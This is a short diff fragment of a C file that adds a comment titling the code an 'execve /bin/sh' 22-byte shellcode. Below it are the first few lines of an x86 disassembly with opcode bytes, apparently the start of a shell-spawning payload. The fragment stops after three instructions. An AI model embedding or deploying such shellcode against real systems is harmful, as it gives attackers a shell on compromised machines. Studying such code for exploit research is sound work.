@@ -1,6 +1,9 @@
 #include <stdio.h>
 
 /*
+
+execve /bin/sh -- 22 Bytes -- 17JAN2017 -- icon
+
 0:  31 c9                   xor    ecx,ecx
 2:  89 ca                   mov    edx,ecx
 4:  51                      push   ecx
